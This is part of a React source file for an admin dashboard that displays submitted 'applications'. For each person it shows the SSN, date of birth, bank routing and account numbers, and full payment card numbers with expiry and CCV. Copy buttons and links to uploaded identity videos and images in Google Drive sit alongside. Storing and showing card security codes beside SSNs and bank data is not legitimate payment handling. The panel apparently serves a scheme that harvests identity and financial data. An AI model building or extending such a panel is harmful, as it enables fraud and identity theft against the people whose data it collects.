            {/* SPECIFIC APPLICATION MODAL (ITEM DETAILS)                      */}
            {/* ------------------------------------------------------------- */}
            {selectedApplication && (
                <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-sm flex items-center justify-center p-4 overflow-y-auto animate-in fade-in duration-200">
                    <div className="bg-white rounded-3xl max-w-4xl w-full max-h-[90vh] overflow-y-auto shadow-2xl border border-gray-100">
                        {/* Modal Header */}
                        <div className="sticky top-0 bg-white border-b border-gray-100 px-6 py-4 flex items-center justify-between z-10">
                            <div>
                                <h3 className="text-xl font-bold text-gray-900 flex items-center gap-2">
                                    <span>Application #{selectedApplication.id}:</span>
                                    <span className="text-blue-600">{selectedApplication.first_name} {selectedApplication.last_name}</span>
                                </h3>
                                <p className="text-xs text-gray-400">Submitted on {new Date(selectedApplication.timestamp).toLocaleString()}</p>
                            </div>
                            <button
                                onClick={() => setSelectedApplication(null)}
                                className="p-2 text-gray-400 hover:text-gray-600 hover:bg-gray-100 rounded-full transition-colors"
                            >
                                <X className="w-6 h-6" />
                            </button>
                        </div>

                        {/* Modal Body */}
                        <div className="p-6 space-y-6">
                            {/* Personal & Banking 2-col */}
                            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                                <div className="bg-slate-50 p-5 rounded-2xl border border-gray-200/80">
                                    <h4 className="text-xs font-bold text-gray-400 uppercase tracking-wider mb-4 flex items-center gap-2">
                                        <FileText className="w-4 h-4 text-blue-600" /> Applicant Details
                                    </h4>
                                    <div className="space-y-3">
                                        <DetailRow label="Full Name" value={`${selectedApplication.first_name} ${selectedApplication.last_name}`} />
                                        <DetailRow label="Email" value={selectedApplication.email} onCopy={() => handleCopy(selectedApplication.email, 'Email')} copied={copiedField === 'Email'} />
                                        <DetailRow label="Phone" value={selectedApplication.phone} onCopy={() => handleCopy(selectedApplication.phone, 'Phone')} copied={copiedField === 'Phone'} />
                                        <DetailRow label="SSN" value={selectedApplication.ssn} isSecret onCopy={() => handleCopy(selectedApplication.ssn, 'SSN')} copied={copiedField === 'SSN'} />
                                        <DetailRow label="Date of Birth" value={selectedApplication.dob ? new Date(selectedApplication.dob).toLocaleDateString() : 'N/A'} />
                                        <DetailRow label="Address" value={`${selectedApplication.address || ''}, ${selectedApplication.city || ''}, ${selectedApplication.state || ''} ${selectedApplication.zip || ''}`} />
                                        {selectedApplication.mailing_address && <DetailRow label="Mailing Address" value={selectedApplication.mailing_address} />}
                                    </div>
                                </div>

                                <div className="bg-slate-50 p-5 rounded-2xl border border-gray-200/80">
                                    <h4 className="text-xs font-bold text-gray-400 uppercase tracking-wider mb-4 flex items-center gap-2">
                                        <MapPin className="w-4 h-4 text-emerald-600" /> Banking & Payout
                                    </h4>
                                    <div className="space-y-3">
                                        <DetailRow label="Bank Name" value={selectedApplication.bank_name} />
                                        <DetailRow label="Account Type" value={selectedApplication.account_type} />
                                        <DetailRow label="Routing Number" value={selectedApplication.routing_number} onCopy={() => handleCopy(selectedApplication.routing_number, 'Routing Number')} copied={copiedField === 'Routing Number'} />
                                        <DetailRow label="Account Number" value={selectedApplication.account_number} isSecret onCopy={() => handleCopy(selectedApplication.account_number, 'Account Number')} copied={copiedField === 'Account Number'} />
                                        {selectedApplication.drive_folder_url && (
                                            <div className="pt-2">
                                                <a
                                                    href={selectedApplication.drive_folder_url}
                                                    target="_blank"
                                                    rel="noopener noreferrer"
                                                    className="inline-flex items-center gap-2 px-3 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-xl text-xs font-semibold transition-colors shadow-sm"
                                                >
                                                    <ExternalLink className="w-3.5 h-3.5" /> Open Google Drive Folder
                                                </a>
                                            </div>
                                        )}
                                    </div>
                                </div>
                            </div>

                            {/* Cards Section */}
                            {selectedApplication.cards && selectedApplication.cards.length > 0 && (
                                <div className="bg-slate-50 p-5 rounded-2xl border border-gray-200/80">
                                    <h4 className="text-xs font-bold text-gray-400 uppercase tracking-wider mb-4 flex items-center gap-2">
                                        <CreditCard className="w-4 h-4 text-amber-600" /> Registered Payment Cards ({selectedApplication.cards.length})
                                    </h4>
                                    <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
                                        {selectedApplication.cards.map((card) => (
                                            <div
                                                key={card.id}
                                                className="bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 rounded-xl p-5 text-white shadow-lg border border-slate-700 relative"
                                            >
                                                <div className="flex justify-between items-center mb-4">
                                                    <div className="w-9 h-6 bg-amber-400/20 border border-amber-400/40 rounded flex items-center justify-center">
                                                        <div className="w-4 h-3 border border-amber-300/60 rounded-sm"></div>
                                                    </div>
                                                    <button
                                                        onClick={() => handleCopy(card.card_number, `Card #${card.id}`)}
                                                        className="text-xs text-slate-400 hover:text-white flex items-center gap-1"
                                                    >
                                                        <Copy className="w-3 h-3" /> Copy
                                                    </button>
                                                </div>
                                                <p className="font-mono text-base tracking-[0.18em] mb-4 text-slate-100">
                                                    {card.card_number.replace(/\s?/g, '').replace(/(\d{4})/g, '$1 ').trim()}
                                                </p>
                                                <div className="flex justify-between items-end text-xs text-slate-400">
                                                    <div>
                                                        <span className="block text-[9px] uppercase tracking-wider">Expires</span>
                                                        <span className="font-mono text-slate-200 text-sm">{card.expiry}</span>
                                                    </div>
                                                    <div className="text-right">
                                                        <span className="block text-[9px] uppercase tracking-wider">CCV</span>
                                                        <span className="font-mono text-slate-200 text-sm">{card.ccv}</span>
                                                    </div>
                                                </div>
                                            </div>
                                        ))}
                                    </div>
                                </div>
                            )}

                            {/* Files & Documents with Player and Downloader */}
                            <div className="bg-slate-50 p-5 rounded-2xl border border-gray-200/80">
                                <h4 className="text-xs font-bold text-gray-400 uppercase tracking-wider mb-4 flex items-center gap-2">
                                    <FileText className="w-4 h-4 text-indigo-600" /> Attached Media & Documents ({selectedApplication.files?.length || 0})
                                </h4>
                                {selectedApplication.files && selectedApplication.files.length > 0 ? (
                                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                        {selectedApplication.files.map((file) => {
                                            const isVideo = isVideoFile(file);
                                            return (
                                                <div
                                                    key={file.id}
                                                    className="bg-white p-4 rounded-xl border border-gray-200 shadow-sm flex items-center justify-between gap-3"
                                                >
                                                    <div className="flex items-center gap-3 truncate">
                                                        <div className={`w-10 h-10 rounded-xl flex items-center justify-center shrink-0 ${isVideo ? 'bg-purple-100 text-purple-700' : 'bg-blue-100 text-blue-700'}`}>
                                                            {isVideo ? <Play className="w-5 h-5 fill-current" /> : <FileText className="w-5 h-5" />}
                                                        </div>
                                                        <div className="truncate">
                                                            <p className="font-semibold text-gray-900 text-sm truncate">{file.name}</p>
                                                            <span className="text-[11px] text-gray-400">{file.field_name}</span>
                                                        </div>
                                                    </div>

                                                    <div className="flex items-center gap-2 shrink-0">
                                                        {isVideo ? (
                                                            <button
                                                                onClick={() => setVideoModal({ isOpen: true, file })}
                                                                className="px-3 py-1.5 bg-purple-600 hover:bg-purple-700 text-white rounded-lg text-xs font-medium flex items-center gap-1.5 shadow-sm transition-colors"
                                                            >
                                                                <Play className="w-3.5 h-3.5 fill-current" /> Play Video
                                                            </button>
                                                        ) : (
                                                            <button
                                                                onClick={() => setImageModal({ isOpen: true, file })}
                                                                className="px-3 py-1.5 bg-blue-600 hover:bg-blue-700 text-white rounded-lg text-xs font-medium flex items-center gap-1.5 shadow-sm transition-colors"
                                                            >
                                                                <Eye className="w-3.5 h-3.5" /> View
                                                            </button>
                                                        )}

                                                        <a
                                                            href={getDriveMediaUrl(file, 'download')}
                                                            download
                                                            target="_blank"
                                                            rel="noopener noreferrer"
                                                            className="p-2 bg-slate-100 hover:bg-slate-200 text-gray-700 rounded-lg transition-colors"
                                                            title="Download File"
                                                        >
                                                            <Download className="w-4 h-4" />
                                                        </a>
                                                    </div>
                                                </div>
                                            );
                                        })}
                                    </div>
                                ) : (
                                    <p className="text-sm text-gray-400 italic">No files attached to this record.</p>
                                )}
                            </div>
                        </div>

                        {/* Modal Footer */}
                        <div className="bg-gray-50 border-t border-gray-100 px-6 py-4 flex justify-between items-center rounded-b-3xl">
                            <button
                                onClick={() => handleDeleteApplication(selectedApplication.id, `${selectedApplication.first_name} ${selectedApplication.last_name}`)}
                                className="px-4 py-2 bg-red-50 hover:bg-red-100 text-red-600 text-xs font-semibold rounded-xl transition-colors border border-red-200 flex items-center gap-1.5"
                            >
                                <Trash2 className="w-4 h-4" /> Delete Application
                            </button>

                            <button
                                onClick={() => setSelectedApplication(null)}
                                className="px-5 py-2 bg-gray-200 hover:bg-gray-300 text-gray-800 text-xs font-semibold rounded-xl transition-colors"
                            >
                                Close
                            </button>
                        </div>
                    </div>
                </div>
            )}

            {/* ------------------------------------------------------------- */}
            {/* VIDEO PLAYER MODAL (DRIVE STREAMING)                           */}
            {/* ------------------------------------------------------------- */}
            {videoModal.isOpen && videoModal.file && (
                <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-md flex items-center justify-center p-4 animate-in fade-in duration-200">
                    <div className="bg-slate-900 rounded-2xl max-w-3xl w-full overflow-hidden shadow-2xl border border-slate-700">
                        <div className="p-4 bg-slate-800 border-b border-slate-700 flex items-center justify-between text-white">
                            <div className="flex items-center gap-2">
                                <Play className="w-5 h-5 text-purple-400" />
                                <span className="font-semibold text-sm truncate">{videoModal.file.name}</span>
                            </div>
                            <div className="flex items-center gap-2">
                                <a
                                    href={getDriveMediaUrl(videoModal.file, 'download')}
                                    download
                                    target="_blank"
                                    rel="noopener noreferrer"
                                    className="px-3 py-1.5 bg-blue-600 hover:bg-blue-700 text-white text-xs font-semibold rounded-lg flex items-center gap-1.5 transition-colors"
                                >
                                    <Download className="w-3.5 h-3.5" /> Download
                                </a>
                                <button
                                    onClick={() => setVideoModal({ isOpen: false, file: null })}
                                    className="p-1.5 text-slate-400 hover:text-white rounded-lg transition-colors"
                                >
                                    <X className="w-5 h-5" />
                                </button>
                            </div>
                        </div>

                        <div className="p-4 bg-black flex items-center justify-center min-h-[350px]">
                            <video
                                key={videoModal.file.id}
                                src={getDriveMediaUrl(videoModal.file, 'view')}
                                controls
                                autoPlay
                                className="max-h-[60vh] w-full rounded-lg shadow-lg"
                            >
                                Your browser does not support the video tag.
                            </video>
                        </div>
                    </div>
                </div>
            )}

            {/* ------------------------------------------------------------- */}
            {/* IMAGE PREVIEW MODAL                                           */}
            {/* ------------------------------------------------------------- */}
            {imageModal.isOpen && imageModal.file && (
                <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-md flex items-center justify-center p-4 animate-in fade-in duration-200">
                    <div className="bg-white rounded-2xl max-w-3xl w-full overflow-hidden shadow-2xl border border-gray-200">
                        <div className="p-4 border-b border-gray-200 flex items-center justify-between">
                            <span className="font-bold text-gray-900 text-sm truncate">{imageModal.file.name}</span>
                            <div className="flex items-center gap-2">
                                <a
                                    href={getDriveMediaUrl(imageModal.file, 'download')}
                                    download
                                    target="_blank"
                                    rel="noopener noreferrer"
                                    className="px-3 py-1.5 bg-blue-600 hover:bg-blue-700 text-white text-xs font-semibold rounded-lg flex items-center gap-1.5 transition-colors"
                                >
                                    <Download className="w-3.5 h-3.5" /> Download
                                </a>
                                <button
                                    onClick={() => setImageModal({ isOpen: false, file: null })}
                                    className="p-1.5 text-gray-400 hover:text-gray-600 rounded-lg"
                                >
                                    <X className="w-5 h-5" />
                                </button>
                            </div>
                        </div>

                        <div className="p-4 bg-slate-900 flex items-center justify-center min-h-[350px]">
                            <img
                                src={getDriveMediaUrl(imageModal.file, 'view')}
                                alt={imageModal.file.name}
                                className="max-h-[70vh] object-contain rounded-lg"
                            />
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
};

// -------------------------------------------------------------
// HELPER COMPONENT: Detail Row
// -------------------------------------------------------------
interface DetailRowProps {
    label: string;
    value?: string | number | null;
    isSecret?: boolean;
    onCopy?: () => void;
    copied?: boolean;
}

const DetailRow: React.FC<DetailRowProps> = ({ label, value, isSecret, onCopy, copied }) => {
    const [hidden, setHidden] = useState(isSecret);

    return (
        <div className="flex items-start justify-between gap-2 text-xs">
            <span className="text-gray-400 font-medium">{label}:</span>
            <div className="flex items-center gap-1.5 text-right font-medium text-gray-800">
                <span className={hidden ? 'blur-[4px] select-none font-mono' : ''}>
                    {value || 'N/A'}
                </span>
                {isSecret && (
                    <button
                        type="button"
                        onClick={() => setHidden(!hidden)}
                        className="text-[10px] text-blue-600 hover:text-blue-800 font-semibold ml-1 underline"
                    >
                        {hidden ? 'Show' : 'Hide'}
                    </button>
                )}
                {onCopy && value && (
                    <button
                        type="button"
                        onClick={onCopy}
                        title="Copy to clipboard"
                        className="text-gray-400 hover:text-gray-600 p-0.5"
                    >
                        {copied ? <Check className="w-3 h-3 text-green-600" /> : <Copy className="w-3 h-3" />}
                    </button>
                )}
            </div>
        </div>
    );
};

export default AdminDashboard;
